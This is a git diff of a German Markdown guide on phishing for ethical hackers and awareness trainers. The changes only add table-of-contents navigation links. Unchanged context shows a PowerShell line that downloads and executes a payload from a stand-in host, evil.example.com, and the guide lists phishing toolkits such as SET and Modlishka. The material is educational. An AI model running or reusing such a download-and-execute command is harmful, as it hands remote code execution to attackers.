@@ -18,6 +18,14 @@
 - [Haftungsausschluss](#haftungsausschluss)
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Warum ist Phishing gefährlich?
 
 - Keine technische Schwachstelle notwendig – der Mensch ist das Ziel
@@ -25,6 +33,14 @@
 - Einstiegspunkt für weitere Angriffe (z. B. Ransomware, interne Pivoting-Angriffe)
 - Auch technische Fachkräfte sind nicht immun
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Typen von Phishing
@@ -39,6 +55,14 @@
 | **Pharming**        | Weiterleitung des Opfers über manipulierte DNS-Einträge |
 | **Credential Harvesting** | Abgreifen von Zugangsdaten über gefälschte Login-Seiten |
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Tools & Frameworks
@@ -70,6 +94,14 @@
 - Für Awareness-Trainings & Security Audits
 - DSGVO-konform planen und dokumentieren
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Beispielhafte Simulationskampagne
 1. Zielgruppe auswählen (z. B. bestimmte Abteilung)
 2. E-Mail-Typ auswählen (z. B. Paketdienst, Microsoft-Login, Urlaubsantrag)
@@ -77,6 +109,14 @@
 4. Tracking aktivieren (z. B. Klicks, Eingaben, Reaktionen)
 5. Reporting & Schulung bereitstellen
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Schutzmaßnahmen gegen Phishing
@@ -87,10 +127,26 @@
 - Browser-Warnungen aktivieren (z. B. Google Safe Browsing)
 - 2FA/MFA verpflichtend einsetzen
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Awareness & Schulung
 - Regelmäßige Trainings für Mitarbeiter:innen
 - Simulierte Phishing-Kampagnen
 - Wiederholende Reminder („Nicht auf alles klicken“)
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Weitere Maßnahmen
 - Passwortmanager verwenden
@@ -98,6 +154,14 @@
 - Prüfung der URL vor Eingabe von Login-Daten
 - Anti-Phishing-Banner in E-Mails einbinden
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Typische Merkmale einer Phishing-Mail
@@ -134,11 +198,27 @@ IEX (New-Object Net.WebClient).DownloadString("http://evil.example.com/payload.p
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Nützliche Quellen & Lernmaterialien
 - [GoPhish Project](https://github.com/gophish/gophish)
 - [SET – Social Engineer Toolkit](https://github.com/trustedsec/social-engineer-toolkit)
 - [Modlishka](https://github.com/drk1wi/Modlishka)
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Haftungsausschluss
@@ -153,12 +233,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
